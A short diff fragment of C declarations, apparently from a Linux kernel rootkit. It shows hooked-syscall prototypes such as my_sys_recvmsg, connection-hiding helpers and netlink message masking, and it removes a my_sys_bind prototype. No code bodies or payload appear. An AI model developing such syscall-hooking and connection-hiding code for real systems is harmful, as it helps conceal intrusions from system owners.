@@ -109,5 +109,4 @@ void unhide_connect(int type, int port);
 static ssize_t my_sys_recvmsg(const struct pt_regs *regs);
 bool get_connect_param(const char* str,int *port,int *type);
 static bool data_should_be_masked(struct nlmsghdr *nlh);
-static long my_sys_bind(const struct pt_regs *regs);
 
